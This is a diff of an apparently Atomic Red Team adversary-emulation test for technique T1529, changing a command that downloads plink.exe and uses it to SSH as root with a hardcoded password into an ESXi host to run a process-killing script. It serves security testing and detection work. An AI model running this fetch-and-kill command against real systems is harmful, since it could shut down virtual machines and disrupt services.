@@ -15,9 +15,9 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\plink.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\plink.exe"; fi; echo ""
-          | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l
-          "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_pkill.txt"'
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -UseBasicParsing;
+          fi; echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local"
+          -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_pkill.txt"'
         elevation_required: false
   plugin: atomic
   singleton: false
@@ -25,8 +25,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - impact
   - atomic-red-team
+  - impact
   - t1529
   author: Atomic Red Team
   additional_info:
@@ -62,9 +62,9 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
-        -OutFile "#{plink_file}"
+        -OutFile "#{plink_file}" -UseBasicParsing
 
         '
     technique_created: '2019-10-04T20:42:28.541Z'
     atomic_guid: 987c9b4d-a637-42db-b1cb-e9e242c3991b
-    import_timestamp: '2026-10-20T07:08:31.049052Z'
+    import_timestamp: '2026-10-21T07:01:52.841329Z'
